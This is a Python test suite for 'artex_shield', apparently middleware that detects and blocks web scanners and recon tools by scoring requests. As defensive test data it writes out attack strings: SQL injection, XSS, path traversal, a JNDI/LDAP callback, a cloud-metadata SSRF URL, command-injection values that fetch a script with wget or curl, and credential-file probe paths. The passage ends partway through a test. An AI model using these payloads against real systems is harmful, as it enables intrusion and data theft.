"""Simulated traffic against the shield. No network, no real scanners: each
test replays the request shapes ARTEX and its toolchain produce."""
import asyncio
import io
import logging
import os
import random
import re
import tempfile
import threading
import time
import unittest
import urllib.parse
from datetime import datetime, timedelta, timezone
from unittest import mock

from artex_shield import (Config, Engagement, Shield, ShieldASGI, ShieldWSGI,
                          html_trap, js_trap, make_canaries, robots_txt_block)
from artex_shield import core, signatures

CHROME = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
          "Chrome/131.0.0.0 Safari/537.36")
BROWSER = {"User-Agent": CHROME, "Accept": "text/html", "Accept-Language": "en-US,en;q=0.9"}
T0 = 1_800_000_000.0
logging.getLogger("artex_shield").disabled = True      # keep test output readable


class Clock:
    def __init__(self):
        self.t = T0

    def __call__(self):
        return self.t


def shield(**kw):
    clock = Clock()
    kw.setdefault("mode", "enforce")
    return Shield(Config(**kw), clock=clock), clock


class Signatures(unittest.TestCase):
    def test_artex_harvester_blocked_on_sight(self):
        s, _ = shield()
        d = s.check("203.0.113.5", "GET", "/", headers={"User-Agent": "Mozilla/5.0 (spa-api-recon)"})
        self.assertEqual(d.action, "block")
        self.assertIn("artex:api-recon-harvester", d.hits)
        # ...and stays blocked with a clean browser disguise.
        self.assertEqual(s.check("203.0.113.5", "GET", "/", headers=BROWSER).action, "block")

    def test_bundled_scanners_blocked(self):
        for ua in ["sqlmap/1.9.9#stable (https://sqlmap.org)", "Fuzz Faster U Fool v2.3.0",
                   "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
                   "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"]:
            s, _ = shield()
            self.assertEqual(s.check("203.0.113.6", "GET", "/", headers={"User-Agent": ua}).action, "block", ua)

    def test_http_library_alone_is_not_throttled(self):
        s, c = shield()
        rng = random.Random(3)
        for _ in range(200):                      # an API client polling with irregular gaps
            c.t += rng.uniform(3, 40)
            d = s.check("198.51.100.7", "GET", "/api/items", headers={"User-Agent": "python-requests/2.32"})
            self.assertEqual(d.action, "pass")

    def test_soft_signals_never_throttle_however_long_they_run(self):
        # An HTTP library polling on the second raises two soft signals (library
        # User-Agent, even cadence). Each repeats once per half-life, so the sum
        # must be watched over several half-lives, not one.
        s, c = shield()
        for _ in range(2 * 3600):
            c.t += 1.0
            d = s.check("198.51.100.8", "GET", "/api/items", headers={"User-Agent": "python-requests/2.32"})
            self.assertEqual(d.action, "pass", f"after {c.t - T0:.0f} s: {d.hits}")
            s.observe("198.51.100.8", "/api/items", 200)
        self.assertLess(s._tracks["198.51.100.8"].score, s.cfg.throttle_score)

    def test_soft_signals_on_one_request_do_not_throttle(self):
        s, _ = shield()                           # headless browser that sends no Accept-Language
        headless = {"User-Agent": CHROME.replace("Chrome/", "HeadlessChrome/")}
        d = s.check("198.51.100.9", "GET", "/", headers=headless)
        self.assertEqual(sorted(d.hits), ["shape:browser-ua-without-browser-headers", "ua:headless-browser"])
        self.assertEqual(d.action, "pass")
        self.assertLess(d.score, s.cfg.throttle_score)

    def test_soft_signals_still_add_to_hard_evidence(self):
        s, c = shield()
        headless = {"User-Agent": CHROME.replace("Chrome/", "HeadlessChrome/")}
        self.assertEqual(s.check("203.0.113.16", "GET", "/swagger.json", headers=headless).action, "pass")
        s.observe("203.0.113.16", "/swagger.json", 404)           # recon probe: hard evidence
        c.t += 1
        self.assertEqual(s.check("203.0.113.16", "GET", "/", headers=headless).action, "throttle")

    def test_soft_cap_must_stay_below_throttle_score(self):
        self.assertLess(Config().soft_cap, Config().throttle_score)
        self.assertLess(Config(throttle_score=20, block_score=40).soft_cap, 20)
        with self.assertRaises(ValueError):
            Config(soft_cap=50)


class Humans(unittest.TestCase):
    def test_normal_browsing_passes(self):
        s, c = shield()
        rng = random.Random(1)
        for page in range(40):
            c.t += rng.uniform(4, 90)             # reading time
            for asset in range(rng.randint(3, 25)):   # then a burst of assets
                c.t += rng.uniform(0.001, 0.08)
                d = s.check("192.0.2.44", "GET", f"/p/{page}/a{asset}.css", headers=BROWSER)
                self.assertEqual(d.action, "pass")
                s.observe("192.0.2.44", f"/p/{page}/a{asset}.css", 200)
        self.assertEqual(s.stats["blocked"] + s.stats["throttled"], 0)
        self.assertEqual(s._tracks["192.0.2.44"].score, 0)   # not one signal raised

    def test_a_few_404s_are_fine(self):
        s, c = shield()
        for i in range(8):
            c.t += 5
            self.assertEqual(s.check("192.0.2.45", "GET", f"/old-link-{i}", headers=BROWSER).action, "pass")
            s.observe("192.0.2.45", f"/old-link-{i}", 404)


class Behaviour(unittest.TestCase):
    def test_path_enumeration_escalates_to_block(self):
        s, c = shield()
        ua = {"User-Agent": CHROME}               # rotating-UA scanner: browser UA, no browser headers
        actions = []
        for i in range(120):
            c.t += 0.5
            d = s.check("203.0.113.9", "GET", f"/guess-{i}", headers=ua)
            actions.append(d.action)
            if not d.stop:
                s.observe("203.0.113.9", f"/guess-{i}", 404)
        self.assertIn("throttle", actions)
        self.assertEqual(actions[-1], "block")

    def test_recon_paths_only_count_when_they_404(self):
        s, c = shield()
        for p in ["/graphql", "/swagger.json", "/actuator/health", "/admin/"]:   # site really has these
            c.t += 1
            self.assertEqual(s.check("192.0.2.50", "GET", p, headers=BROWSER).action, "pass")
            s.observe("192.0.2.50", p, 200)
        s2, c2 = shield()
        last = None
        for p in ["/graphql", "/swagger.json", "/openapi.json", "/v2/api-docs", "/actuator/env"]:
            c2.t += 1
            last = s2.check("203.0.113.10", "GET", p, headers=BROWSER)
            if not last.stop:
                s2.observe("203.0.113.10", p, 404)
        self.assertNotEqual(last.action, "pass")

    def test_sensitive_file_probe(self):
        s, _ = shield()
        d = s.check("203.0.113.11", "GET", "/.env", headers=BROWSER)
        self.assertEqual(d.action, "throttle")
        self.assertEqual(s.check("203.0.113.11", "GET", "/.git/config", headers=BROWSER).action, "block")

    def test_payloads(self):
        cases = ["id=1%27%20UNION%20SELECT%20null,version()--", "q=%3Cscript%3Ealert(1)%3C/script%3E",
                 "file=..%2f..%2f..%2fetc%2fpasswd", "n=%7B%7B7*7%7D%7D", "u=http://169.254.169.254/latest/",
                 "x=%2527%2520or%2520%25271"]     # double-encoded
        for q in cases:
            s, _ = shield()
            d = s.check("203.0.113.12", "GET", "/search", q, BROWSER)
            self.assertTrue(any(h.startswith("payload:") for h in d.hits), q)
            self.assertEqual(d.action, "throttle", q)
            self.assertEqual(s.check("203.0.113.12", "GET", "/search", q, BROWSER).action, "block", q)

    def test_oob_marker_in_header(self):
        s, _ = shield()
        h = dict(BROWSER, Referer="${jndi:ldap://c9abc.oast.fun/a}")
        d = s.check("203.0.113.13", "GET", "/", headers=h)
        self.assertIn("payload:jndi", d.hits)
        self.assertEqual(d.action, "block")       # jndi + callback domain

    def test_ordinary_search_text_is_not_a_payload(self):
        s, _ = shield()
        for q in ["q=select+a+union+rep", "q=sleep+tips", "q=o'reilly+books", "next=/account/settings"]:
            self.assertEqual(s.check("192.0.2.60", "GET", "/search", q, BROWSER).hits, [], q)

    def test_ordinary_query_strings_are_not_payloads(self):
        # `&`, `|` and `;` hold query strings and lists together; a parameter or
        # list item called id, cat, sh, nc, uname or curl is not a shell command.
        s, _ = shield()
        for path, q in [("/products", "page=2&id=5"), ("/blog", "p=1&cat=3"), ("/search", "tags=dog|cat"),
                        ("/api/items", "fields=name|id|price"), ("/api/items", "cols=uname;id;sh"),
                        ("/list", "a=1&sh=2&nc=3&uname=bob&curl=4&wget=5&bash=6"),
                        ("/list", "color=red;id=5;cat=3"), ("/login", "next=%2Fitems%3Fpage%3D2%26id%3D5"),
                        ("/items;id=5", "page=2"), ("/search", "q=R%26D+jobs&id=3"), ("/go", "a=1&&id=5")]:
            self.assertEqual(s.check("192.0.2.61", "GET", path, q, BROWSER).hits, [], f"{path}?{q}")

    def test_command_injection_is_still_scored(self):
        for q in ["host=127.0.0.1%3Bcat%20%2Ftmp%2Fkey", "host=x%7Cwhoami", "host=x%26%26id", "host=x%7C%7Cid",
                  "host=%60id%60", "host=%24(id)", "host=x%3Bwget%20http%3A%2F%2F198.51.100.1%2Fa.sh",
                  "host=x%7Csh%20-c%20ls", "host=x;uname -a", "host=x%253Bcurl%2520198.51.100.1"]:
            s, _ = shield()
            self.assertIn("payload:cmdi", s.check("203.0.113.17", "GET", "/ping", q, BROWSER).hits, q)

    def test_propfind_is_a_soft_signal(self):
        # Windows and Office send PROPFIND by themselves when someone opens a link
        # from a document, so it cannot be worth 30 points every time.
        s, c = shield()
        webdav = {"User-Agent": "Microsoft-WebDAV-MiniRedir/10.0.19045", "Accept-Language": "en"}
        hits = []
        for method in ["OPTIONS", "PROPFIND", "PROPFIND", "PROPFIND", "PROPFIND", "GET"] * 3:
            c.t += 0.3
            d = s.check("192.0.2.62", method, "/docs/report.docx", headers=webdav)
            self.assertEqual(d.action, "pass", method)
            hits += d.hits
        self.assertEqual(hits, ["method:PROPFIND"])                 # counted once per half-life
        self.assertLess(s._tracks["192.0.2.62"].score, s.cfg.throttle_score)
        # With every other soft signal piled on, for an hour, it still stops nothing.
        s, c = shield(tls_header="X-JA4", tls_denylist=["t13d_example"])
        loud = {"User-Agent": CHROME.replace("Chrome/", "HeadlessChrome/") + " python-requests/2.32",
                "X-JA4": "t13d_example"}
        for _ in range(3600):
            c.t += 1.0
            d = s.check("192.0.2.63", "PROPFIND", "/docs/report.docx", headers=loud)
            self.assertEqual(d.action, "pass", d.hits)
        self.assertEqual(s._tracks["192.0.2.63"].hard, 0)
        self.assertLessEqual(s._tracks["192.0.2.63"].soft_points, s.cfg.soft_cap)

    def test_other_odd_methods_are_scored_every_time(self):
        for method in ["TRACE", "TRACK", "CONNECT", "DEBUG"]:
            s, _ = shield()
            self.assertEqual(s.check("203.0.113.19", method, "/", headers=BROWSER).action, "pass", method)
            self.assertEqual(s.check("203.0.113.19", method, "/", headers=BROWSER).action, "throttle", method)
        s, c = shield()                           # and PROPFIND still adds to hard evidence
        s.check("203.0.113.20", "TRACE", "/", headers=BROWSER)
        self.assertEqual(s.check("203.0.113.20", "PROPFIND", "/", headers=BROWSER).action, "throttle")

    def test_metronomic_cadence_is_flagged_but_soft(self):
        s, c = shield()
        rng = random.Random(2)
        hits = []
        for _ in range(60):                       # ARTEX "quiet" profile: 2 req/s, <=250 ms jitter
            c.t += 0.5 + rng.uniform(0, 0.25)
            d = s.check("203.0.113.14", "GET", "/api/items", headers=BROWSER)
            hits += d.hits
        self.assertEqual(hits.count("behavior:metronomic-cadence"), 1)
        self.assertEqual(d.action, "pass")        # one soft signal never throttles on its own

    def test_ignoring_retry_after_escalates(self):
        s, c = shield()
        s.check("203.0.113.15", "GET", "/.env", headers=BROWSER)          # 60 -> throttled
        d = None
        for _ in range(12):                       # hammering inside the Retry-After window
            c.t += 1
            d = s.check("203.0.113.15", "GET", "/", headers=BROWSER)
        self.assertEqual(d.action, "block")

    def test_backing_off_recovers(self):
        s, c = shield()
        d = s.check("192.0.2.70", "GET", "/.env", headers=BROWSER)
        self.assertEqual(d.action, "throttle")
        self.assertEqual(d.retry_after, 159)      # 600 s * log2(60/50), rounded up, +1
        c.t += d.retry_after                     # waited as told
        self.assertEqual(s.check("192.0.2.70", "GET", "/", headers=BROWSER).action, "pass")


class Decoys(unittest.TestCase):
    def test_canary_is_instant_block(self):
        canaries = make_canaries("site-secret")
        s, _ = shield(canary_paths=canaries)
        self.assertEqual(s.check("192.0.2.80", "GET", "/", headers=BROWSER).action, "pass")
        d = s.check("192.0.2.80", "GET", canaries[0], headers=BROWSER)
        self.assertEqual((d.action, d.hits), ("block", ["decoy:canary-path"]))

    def test_canaries_match_what_artex_harvests(self):
        # ARTEX's static harvester (skills/api-recon/scripts/harvest_static.py) keeps a
        # quoted path when a segment looks like an API prefix and it has no asset extension.
        prefixes = {"api", "rest", "service", "services", "gateway", "graphql", "web", "admin", "backend", "open"}
        assets = {"js", "css", "png", "jpg", "jpeg", "svg", "gif", "woff", "woff2", "ttf", "ico", "map", "json",
                  "mp4", "webp"}
        for c in make_canaries("site-secret", 5):
            self.assertIn(f'"{c}"', js_trap(c))
            self.assertRegex(c, r"^/[A-Za-z0-9_\-./]+$")
            segments = c.strip("/").split("/")
            self.assertTrue(prefixes & set(segments), c)
            self.assertNotIn(segments[-1].rsplit(".", 1)[-1].lower(), assets, c)

    def test_helpers(self):
        c = make_canaries("k", 2)
        self.assertEqual(make_canaries("k", 2), c)
        self.assertNotEqual(make_canaries("other", 2), c)
        self.assertIn(f"Disallow: {c[0]}", robots_txt_block(c))
        self.assertIn('aria-hidden="true"', html_trap(c[0]))


class IFF(unittest.TestCase):
    def setUp(self):
        now = datetime.fromtimestamp(T0, timezone.utc)
        self.eng = Engagement("FS-17", ["198.51.100.0/24"], now - timedelta(hours=1), now + timedelta(hours=1))
        self.ua = {"User-Agent": "ARTEX-Assessment/1.0 (engagement=FS-17)"}

    def test_verified_engagement_is_friendly(self):
        s, _ = shield(engagements=[self.eng])
        d = s.check("198.51.100.24", "GET", "/.env", "id=1' or '1", self.ua)
        self.assertTrue(d.friendly)
        self.assertEqual(d.action, "pass")

    def test_label_from_wrong_address_is_hostile(self):
        s, _ = shield(engagements=[self.eng])
        self.assertEqual(s.check("203.0.113.9", "GET", "/", headers=self.ua).action, "block")

    def test_label_outside_window_is_hostile(self):
        s, c = shield(engagements=[self.eng])
        c.t += 2 * 3600
        self.assertEqual(s.check("198.51.100.24", "GET", "/", headers=self.ua).action, "block")

    def test_wrong_or_missing_reference_is_hostile(self):
        s, _ = shield(engagements=[self.eng])
        for ua in ["ARTEX-Assessment/1.0 (engagement=FS-18)", "ARTEX-Assessment/1.0"]:
            self.assertEqual(s.check("198.51.100.30", "GET", "/", headers={"User-Agent": ua}).action, "block")
            s.unblock("198.51.100.30")

    def test_allow_cidr_and_exempt_path(self):
        s, _ = shield(allow_cidrs=["10.0.0.0/8"], exempt_paths=["/healthz"])
        self.assertEqual(s.check("10.1.2.3", "GET", "/.env", headers={"User-Agent": "sqlmap/1"}).action, "pass")
        self.assertEqual(s.check("203.0.113.1", "GET", "/healthz", headers={"User-Agent": "curl/8"}).score, 0)


class Plumbing(unittest.TestCase):
    def test_monitor_mode_never_stops_a_request(self):
        events = []
        s, _ = shield(mode="monitor", on_event=events.append)
        d = s.check("203.0.113.20", "GET", "/", headers={"User-Agent": "sqlmap/1.9"})
        self.assertEqual((d.action, d.stop), ("block", False))
        self.assertEqual(events[0]["action"], "block")
        self.assertFalse(events[0]["enforced"])

    def test_forwarded_for_trusted_only_from_own_proxy(self):
        s, _ = shield(trusted_proxies=["10.0.0.0/8"])
        self.assertEqual(s.client_ip("10.0.0.2", "203.0.113.7, 10.0.0.9"), "203.0.113.7")
        self.assertEqual(s.client_ip("10.0.0.2", "1.1.1.1, 203.0.113.7"), "203.0.113.7")   # client-forged left side
        self.assertEqual(s.client_ip("203.0.113.99", "8.8.8.8"), "203.0.113.99")           # direct peer: ignore header
        self.assertEqual(s.client_ip("10.0.0.2", "garbage"), "10.0.0.2")

    def test_forwarded_for_hop_with_a_port(self):
        s, _ = shield(trusted_proxies=["10.0.0.0/8"])     # some load balancers append the source port
        self.assertEqual(s.client_ip("10.0.0.2", "203.0.113.7:44321"), "203.0.113.7")
        self.assertEqual(s.client_ip("10.0.0.2", "[2001:db8::7]:443"), "2001:db8::7")
        self.assertEqual(s.client_ip("10.0.0.2", "[2001:db8::7]"), "2001:db8::7")
        self.assertEqual(s.client_ip("10.0.0.2", "1.1.1.1, 203.0.113.7:44321, 10.0.0.9:80"), "203.0.113.7")

    def test_unidentified_client_is_not_scored(self):
        # When the only address available is the proxy's own, or none at all,
        # every visitor would share one track and one scanner would block them all.
        events = []
        s, c = shield(trusted_proxies=["10.0.0.0/8"], on_event=events.append)
        scanner = {"User-Agent": "sqlmap/1.9"}
        for ip in [s.client_ip("10.0.0.2", "unknown"),     # proxy passed on a hop it could not name
                   s.client_ip("10.0.0.2", None),          # proxy sent no header
                   s.client_ip("", "203.0.113.7"),         # unix socket: no peer address
                   "not-an-address"]:
            d = s.check(ip, "GET", "/.env", "id=1' UNION SELECT 1", scanner)
            self.assertEqual((d.action, d.score), ("pass", 0.0), ip)
            self.assertEqual(s.check(ip, "GET", "/", headers=BROWSER).action, "pass", ip)
        self.assertEqual(s.blocklist(), {})
        self.assertEqual(s._tracks, {})
        self.assertEqual(s.stats["unidentified"], 8)
        self.assertEqual([e["action"] for e in events], ["unidentified"])       # one warning, not one per request
        c.t += s.cfg.half_life
        s.check("10.0.0.2", "GET", "/", headers=BROWSER)
        self.assertEqual(len(events), 2)
        # Clients the proxy does name are still scored.
        self.assertEqual(s.check(s.client_ip("10.0.0.2", "203.0.113.7"), "GET", "/", headers=scanner).action, "block")

    def test_unix_socket_peer_can_be_trusted(self):
        s, _ = shield(trusted_proxies=["0.0.0.0/32"])     # the address an absent peer is given
        self.assertEqual(s.client_ip("", "203.0.113.7"), "203.0.113.7")
        self.assertEqual(s.check(s.client_ip("", "203.0.113.7"), "GET", "/", headers={"User-Agent": "sqlmap/1"}).action,
                         "block")
        self.assertEqual(s.check(s.client_ip("", "198.51.100.9"), "GET", "/", headers=BROWSER).action, "pass")

    def test_scores_halve_every_half_life_and_drop_to_zero_below_half_a_point(self):
        s, c = shield()
        quiet = dict(BROWSER, **{"Sec-Fetch-Site": "none"})
        self.assertEqual(s.check("203.0.113.40", "TRACE", "/", headers=quiet).score, 30)
        expected = [(300, 30 * 0.5 ** 0.5), (600, 15), (1200, 7.5), (1800, 3.75), (2400, 1.875), (3000, 0.9375),
                    (3300, 0.9375 * 0.5 ** 0.5), (3600, 0)]           # 0.46875 is under half a point: 0
        for at, score in expected:
            c.t = T0 + at
            self.assertAlmostEqual(s.check("203.0.113.40", "GET", "/", headers=quiet).score, score, places=9, msg=at)

    def test_ipv6_tracked_per_64(self):
        s, _ = shield()
        s.check("2001:db8:1:2::1", "GET", "/", headers={"User-Agent": "sqlmap/1"})
        self.assertEqual(s.check("2001:db8:1:2:ffff::9", "GET", "/", headers=BROWSER).action, "block")
        self.assertEqual(s.check("2001:db8:1:3::1", "GET", "/", headers=BROWSER).action, "pass")

    def test_block_expires_and_repeat_offence_doubles(self):
        s, c = shield()
        bad = {"User-Agent": "sqlmap/1"}
        s.check("203.0.113.30", "GET", "/", headers=bad)
        c.t += 3601
        self.assertEqual(s.check("203.0.113.30", "GET", "/", headers=BROWSER).action, "pass")
        s.check("203.0.113.30", "GET", "/", headers=bad)
        c.t += 3601
        self.assertEqual(s.check("203.0.113.30", "GET", "/", headers=BROWSER).action, "block")   # 2 h this time
        c.t += 3601
        self.assertEqual(s.check("203.0.113.30", "GET", "/", headers=BROWSER).action, "pass")

    def test_blocklist_export(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "deny.conf")
            s, _ = shield(blocklist_export_path=path)
            s.check("203.0.113.40", "GET", "/", headers={"User-Agent": "sqlmap/1"})
            s.check("2001:db8::1", "GET", "/", headers={"User-Agent": "sqlmap/1"})
            with open(path) as f:
                self.assertEqual(f.read(), "deny 2001:db8::/64;\ndeny 203.0.113.40;\n")

    def test_track_table_is_bounded(self):
        s, _ = shield(max_tracks=100)
        for i in range(1000):
            s.check(f"198.18.{i // 256}.{i % 256}", "GET", "/", headers=BROWSER)
        self.assertEqual(len(s._tracks), 100)

    def test_tls_denylist(self):
        s, _ = shield(tls_header="X-JA4", tls_denylist=["t13d_example"])
        d = s.check("203.0.113.50", "GET", "/", headers=dict(BROWSER, **{"X-JA4": "t13d_example"}))
        self.assertIn("tls:denylisted-fingerprint", d.hits)


class Adapters(unittest.TestCase):
    def test_wsgi(self):
        def app(environ, start_response):
            ok = environ["PATH_INFO"] == "/"
            start_response("200 OK" if ok else "404 Not Found", [("Content-Type", "text/plain")])
            return [b"hi"]

        s, c = shield()
        wrapped = ShieldWSGI(app, s)

        def call(path, ua=CHROME, lang="en", ip="203.0.113.60"):
            env = {"REQUEST_METHOD": "GET", "PATH_INFO": path, "QUERY_STRING": "", "REMOTE_ADDR": ip,
                   "HTTP_USER_AGENT": ua, "HTTP_ACCEPT_LANGUAGE": lang, "wsgi.input": io.BytesIO()}
            out = {}
            body = b"".join(wrapped(env, lambda st, h, e=None: out.update(status=st, headers=dict(h))))
            return out["status"], out["headers"], body

        self.assertEqual(call("/")[0], "200 OK")
        for i in range(15):                       # 404s flow back through observe()
            c.t += 1
            call(f"/nope-{i}")
        self.assertEqual(s._tracks["203.0.113.60"].score, 40)
        status, headers, _ = call("/.env", ip="203.0.113.62")
        self.assertEqual(status, "429 Too Many Requests")
        self.assertGreaterEqual(int(headers["Retry-After"]), 120)
        status, _, body = call("/", ua="sqlmap/1")
        self.assertEqual(status, "403 Forbidden")
        self.assertIn(b"Reference:", body)

    def test_wsgi_without_a_peer_address_blocks_nobody(self):
        def app(environ, start_response):
            start_response("200 OK", [("Content-Type", "text/plain")])
            return [b"hi"]

        s, _ = shield()
        wrapped = ShieldWSGI(app, s)

        def call(ua):                              # served over a unix socket: REMOTE_ADDR is empty
            env = {"REQUEST_METHOD": "GET", "PATH_INFO": "/", "QUERY_STRING": "", "REMOTE_ADDR": "",
                   "HTTP_USER_AGENT": ua, "HTTP_ACCEPT_LANGUAGE": "en", "HTTP_X_FORWARDED_FOR": "203.0.113.7",
                   "wsgi.input": io.BytesIO()}
            out = {}
            b"".join(wrapped(env, lambda st, h, e=None: out.update(status=st)))
            return out["status"]

        self.assertEqual(call("sqlmap/1.9"), "200 OK")
        self.assertEqual(call(CHROME), "200 OK")           # the next visitor is not paying for the scanner

    def test_asgi(self):
        async def app(scope, receive, send):
            await send({"type": "http.response.start", "status": 200, "headers": []})
            await send({"type": "http.response.body", "body": b"hi"})

        s, _ = shield()
        wrapped = ShieldASGI(app, s)

        async def call(ua):
            sent = []
            scope = {"type": "http", "method": "GET", "path": "/", "query_string": b"",
                     "client": ("203.0.113.61", 5555),
                     "headers": [(b"user-agent", ua.encode()), (b"accept-language", b"en")]}

            async def send(m):
                sent.append(m)

            await wrapped(scope, None, send)
            return sent[0]["status"]

        self.assertEqual(asyncio.run(call(CHROME)), 200)
        self.assertEqual(asyncio.run(call("Mozilla/5.0 (spa-api-recon spider)")), 403)


def wsgi_site(s, real=("/", "/products", "/thread/7")):
    """A small site behind the WSGI adapter. Returns visit(path, query, headers, ip, method) -> status code."""
    def app(environ, start_response):
        ok = environ["PATH_INFO"] in real
        start_response("200 OK" if ok else "404 Not Found", [("Content-Type", "text/plain")])
        return [b"hi"]

    wrapped = ShieldWSGI(app, s)

    def visit(path, query="", headers=None, ip="192.0.2.200", method="GET"):
        env = {"REQUEST_METHOD": method, "PATH_INFO": path, "QUERY_STRING": query, "REMOTE_ADDR": ip,
               "HTTP_HOST": "shop.example", "wsgi.input": io.BytesIO()}
        for k, v in (BROWSER if headers is None else headers).items():
            env["HTTP_" + k.upper().replace("-", "_")] = v
        out = {}
        b"".join(wrapped(env, lambda st, h, e=None: out.update(status=st)))
        return int(out["status"].split()[0])

    return visit


# What a browser adds when a page, not the person, made it send the request.
CROSS_SITE_IMAGE = dict(BROWSER, **{"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "no-cors",
                                    "Sec-Fetch-Dest": "image", "Referer": "https://forum.example/"})
CROSS_SITE_LINK = dict(BROWSER, **{"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate",
                                   "Sec-Fetch-Dest": "document", "Sec-Fetch-User": "?1"})
SIBLING_SITE_FETCH = dict(BROWSER, **{"Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors",
                                      "Sec-Fetch-Dest": "empty", "Origin": "https://users.shop.example"})
OWN_PAGE_IMAGE = dict(BROWSER, **{"Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "no-cors",
                                  "Sec-Fetch-Dest": "image", "Referer": "https://shop.example/thread/7"})
OLD_BROWSER_FOREIGN_REFERER = dict(BROWSER, Referer="https://forum.example/post/9")    # no fetch metadata at all
INDUCED = {"cross-site image": CROSS_SITE_IMAGE, "cross-site link": CROSS_SITE_LINK,
           "sibling-site fetch": SIBLING_SITE_FETCH, "image on the site's own page": OWN_PAGE_IMAGE,
           "foreign Referer, old browser": OLD_BROWSER_FOREIGN_REFERER}
# The person's own doing, as far as the browser says: typed or bookmarked, a
# click inside the site, the site's own script. And a client that says nothing.
DIRECT = {"typed": dict(BROWSER, **{"Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document"}),
          "click inside the site": dict(BROWSER, **{"Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
                                                    "Sec-Fetch-Dest": "document", "Sec-Fetch-User": "?1",
                                                    "Referer": "https://shop.example/"}),
          "the site's own script": dict(BROWSER, **{"Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors",
                                                    "Sec-Fetch-Dest": "empty", "Referer": "https://shop.example/"}),
          "own-site Referer, old browser": dict(BROWSER, Referer="https://shop.example/products"),
          "no context headers": BROWSER}


class MissingPages(unittest.TestCase):
    """Issue 5: a 404 is not always a guess."""

    def test_polling_one_missing_resource_is_not_enumeration(self):
        s, c = shield()
        visit = wsgi_site(s)
        for _ in range(300):                      # a job result that is not ready yet, asked for every 2 s
            c.t += 2
            self.assertEqual(visit("/api/jobs/42/result"), 404)
        self.assertEqual(s._tracks["192.0.2.200"].hard, 0)       # even pacing is a soft signal; nothing hard

    def test_reloading_the_same_dead_links_counts_them_once(self):
        s, c = shield()
        visit = wsgi_site(s)
        for reload in range(4):                   # one page with 20 dead links, loaded four times
            c.t += 90
            for i in range(20):
                c.t += 0.05
                self.assertEqual(visit(f"/gallery/item-{i}"), 404, f"reload {reload}")
        self.assertLessEqual(s._tracks["192.0.2.200"].score, 40)     # one enumeration hit, decaying

    def test_missing_page_assets_are_not_enumeration(self):
        s, c = shield()
        visit = wsgi_site(s)
        for load in range(3):                     # a stale page asking for chunks a deploy removed
            c.t += 300
            for i in range(30):
                c.t += 0.02
                name = f"/static/chunk-{load}-{i}." + ("js", "js.map", "css")[i % 3]
                self.assertEqual(visit(name), 404, name)
        self.assertEqual(s._tracks["192.0.2.200"].score, 0)
        s2, c2 = shield(enum_ignore_extensions=())               # an operator can count them after all
        visit2 = wsgi_site(s2)
        for i in range(15):
            c2.t += 0.02
            visit2(f"/static/chunk-{i}.js")
        self.assertEqual(s2._tracks["192.0.2.200"].score, 40)

    def test_404s_under_an_ignored_prefix_are_not_enumeration(self):
        s, c = shield(enum_ignore_prefixes=["/api/stock"])
        visit = wsgi_site(s)
        for i in range(60):                       # "is this item in stock?" answered 404 for no
            c.t += 0.5
            self.assertEqual(visit(f"/api/stock/{i}"), 404)
        self.assertEqual(s._tracks["192.0.2.200"].hard, 0)
        for i in range(15):                       # the same shape next to the prefix is still counted
            c.t += 0.5
            visit(f"/api/stock-admin/{i}")
        self.assertEqual(s._tracks["192.0.2.200"].hard, 40)
        with self.assertRaises(ValueError):
            Config(enum_ignore_prefixes=["api"])


class SensitiveNames(unittest.TestCase):
    """Issue 6: a file name is evidence only if the site has no such file."""
    REAL = ("/downloads/employee-handbook.zip", "/files/feedback-2026.zip", "/dl/sandbox-tools.tar",
            "/exports/customer-database.zip", "/docs/notes.old", "/backups/site-backup.tar")

    def test_downloads_the_site_really_serves_are_not_probes(self):
        s, c = shield()
        visit = wsgi_site(s, real=self.REAL)
        for _ in range(3):
            for path in self.REAL:
                c.t += 1
                self.assertEqual(visit(path), 200, path)
        self.assertEqual(s._tracks["192.0.2.200"].score, 0)

    def test_asking_for_a_dump_the_site_does_not_have_is_a_probe(self):
        events = []
        s, c = shield(on_event=events.append)
        visit = wsgi_site(s)
        self.assertEqual(visit("/db-backup.sql"), 404)            # the app answers first...
        self.assertEqual(events[-1]["hits"], ["decoy:sensitive-file-probe"])
        self.assertEqual(visit("/"), 429)                         # ...then it counts: 60 points
        self.assertEqual(visit("/index.php.bak", ip="192.0.2.201"), 404)
        self.assertEqual(visit("/", ip="192.0.2.201"), 429)

    def test_a_dead_link_to_an_ordinary_archive_is_not_a_probe(self):
        s, c = shield()
        visit = wsgi_site(s)
        for path in ["/downloads/employee-handbook.zip", "/files/feedback-2026.zip", "/dl/sandbox-tools.tar"]:
            c.t += 1                               # "db" inside handbook, feedback, sandbox
            self.assertEqual(visit(path), 404)
        self.assertEqual(s._tracks["192.0.2.200"].score, 0)
        for path in ["/mydb.sql", "/db_2026.zip", "/userdb-export.tar"]:
            s2, _ = shield()
            wsgi_site(s2)(path)
            self.assertEqual(s2._tracks["192.0.2.200"].score, 60, path)

    def test_dotfiles_and_keys_are_still_scored_on_sight(self):
        for path in ["/.env", "/.git/config", "/.aws/credentials", "/id_rsa", "/wp-config.php.bak", "/server-status"]:
            s, _ = shield()
            d = s.check("203.0.113.70", "GET", path, headers=BROWSER)
            self.assertEqual((d.action, d.hits), ("throttle", ["decoy:sensitive-file-probe"]), path)
        s, _ = shield(mode="monitor")             # served in monitor mode, then a 404: still one probe, not two
        s.check("203.0.113.71", "GET", "/wp-config.php.bak", headers=BROWSER)
        s.observe("203.0.113.71", "/wp-config.php.bak", 404)
        self.assertEqual(s._tracks["203.0.113.71"].score, 60)


class InducedRequests(unittest.TestCase):
    """Issue 7: a request some page made the visitor's browser send is never
    held against the visitor. Otherwise anyone who can show them an image tag
    can have them blocked."""

    def setUp(self):
        self.canaries = make_canaries("site-secret")

    def test_canary_loaded_by_another_page_does_not_block_the_visitor(self):
        for name, headers in INDUCED.items():
            s, c = shield(canary_paths=self.canaries)
            visit = wsgi_site(s)
            self.assertEqual(visit(self.canaries[0], headers=headers), 403, name)     # that one request is refused
